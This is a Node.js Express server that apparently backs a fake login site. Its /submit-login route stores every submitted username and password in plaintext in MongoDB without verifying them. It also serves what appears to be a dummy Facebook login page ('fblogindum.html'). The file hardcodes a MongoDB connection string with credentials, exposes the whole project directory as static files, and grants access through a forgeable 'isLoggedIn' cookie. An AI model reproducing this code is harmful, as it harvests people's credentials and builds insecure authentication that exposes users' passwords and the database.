const express = require('express');
const mongoose = require('mongoose');
const bodyParser = require('body-parser');
const cookieParser = require('cookie-parser'); // Add cookie-parser
const fs = require('fs');
const path = require('path');
const { MongoClient } = require('mongodb');

const app = express();
const PORT = process.env.PORT || 3000;

const uri = "mongodb+srv://user1:user123@login.cygdj.mongodb.net/?retryWrites=true&w=majority&appName=login";
const client = new MongoClient(uri);

let db; // Declare the db variable

async function connectToDatabase() {
    try {
        await client.connect();
        db = client.db('logdata'); // Your actual database name
        console.log("Connected to MongoDB");
    } catch (error) {
        console.error("MongoDB connection error:", error.message || error);
    }
}

connectToDatabase();

// Middleware to parse form data and cookies
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.json());
app.use(cookieParser()); // Use cookie-parser
app.use(express.static(__dirname)); // Serve static files from the current directory

// Route to handle login form submission
app.post('/submit-login', async (req, res) => {
    const { username, password } = req.body;

    try {
        if (!db) {
            console.error("Database connection not initialized.");
            return res.status(500).send('Database connection not initialized.');
        }

        const loginData = { username, password, timestamp: new Date() };
        console.log("Attempting to insert data:", loginData);
        const result = await db.collection('ifsh').insertOne(loginData);
        console.log("Data inserted successfully:", result);

        // Set a login cookie to mark the user as authenticated
        res.cookie('isLoggedIn', true, { httpOnly: true, maxAge: 3600000 }); // Cookie expires in 1 hour
        res.redirect('/Job Postings.html');
    } catch (error) {
        console.error('Error saving data to MongoDB:', error);
        res.status(500).send('Error saving data to MongoDB.');
    }
});

// Route to check if user credentials are in the database
app.post('/check-credentials', async (req, res) => {
    const { username, password } = req.body;

    try {
        if (!db) {
            console.error("Database connection not initialized.");
            return res.status(500).json({ success: false, message: 'Database connection not initialized.' });
        }

        // Query the database to see if the user credentials exist
        const user = await db.collection('ifsh').findOne({ username, password });

        if (user) {
            // Credentials found
            res.json({ success: true });
        } else {
            // Credentials not found
            res.json({ success: false });
        }
    } catch (error) {
        console.error('Error checking credentials:', error);
        res.status(500).json({ success: false, message: 'Error checking credentials' });
    }
});

// Routes to serve HTML files
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'Home.html'));
});
app.get('/Job Postings.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'Job Postings.html'));
});
app.get('/Announcements.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'Announcements.html'));
});
app.get('/public/fblogindum.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'fblogindum.html'));
});

// Start the server
app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});
